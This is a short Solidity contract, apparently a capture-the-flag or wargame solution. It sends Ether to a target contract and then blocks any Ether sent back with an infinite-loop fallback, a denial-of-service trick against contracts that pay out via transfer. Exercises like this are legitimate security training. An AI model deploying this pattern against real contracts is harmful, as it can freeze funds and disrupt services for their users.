// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Attack{
    constructor(address _addr)payable{
        payable(_addr).call{value:msg.value}("");
    }
        //this level could be passed
        //with no fallback function
    fallback() external payable {
        //transfer is used
        //there is 2300 of gas to consume
        while(true){}
     }
}
